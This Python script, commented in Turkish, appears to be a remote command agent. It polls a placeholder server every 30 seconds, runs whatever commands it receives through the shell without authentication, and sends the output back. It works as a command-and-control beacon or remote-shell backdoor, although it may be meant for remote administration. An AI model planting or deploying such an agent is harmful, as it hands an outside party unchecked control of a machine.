import requests
import subprocess
import time
import json

SERVER_URL = "http://SERVER_IP:5000"  # Sunucu IP'sini buraya girin
AGENT_ID = "WINDOWS_PC_001"  # Benzersiz agent ID

def execute_command(command):
    try:
        result = subprocess.run(
            command, 
            shell=True, 
            capture_output=True, 
            text=True, 
            timeout=60
        )
        return result.stdout, result.stderr, result.returncode
    except Exception as e:
        return "", str(e), -1

def main():
    while True:
        try:
            # Komutları kontrol et
            response = requests.get(
                f"{SERVER_URL}/agent_get_commands",
                params={"agent_id": AGENT_ID},
                timeout=30
            )
        
            if response.status_code == 200:
                commands = response.json().get('commands', [])
            
                for cmd in commands:
                    # Komutu çalıştır
                    stdout, stderr, returncode = execute_command(cmd['command'])
                
                    # Sonucu sunucuya gönder
                    requests.post(
                        f"{SERVER_URL}/agent_response",
                        json={
                            'agent_id': AGENT_ID,
                            'command_id': cmd['id'],
                            'output': stdout,
                            'error': stderr,
                            'return_code': returncode
                        }
                    )
        
            # Bağlantı durumunu güncelle
            requests.post(
                f"{SERVER_URL}/agent_heartbeat",
                json={'agent_id': AGENT_ID, 'status': 'online'}
            )
        
        except requests.exceptions.RequestException:
            # Bağlantı hatası - yeniden dene
            pass
    
        time.sleep(30)  # 30 saniyede bir kontrol et

if __name__ == "__main__":
    main()
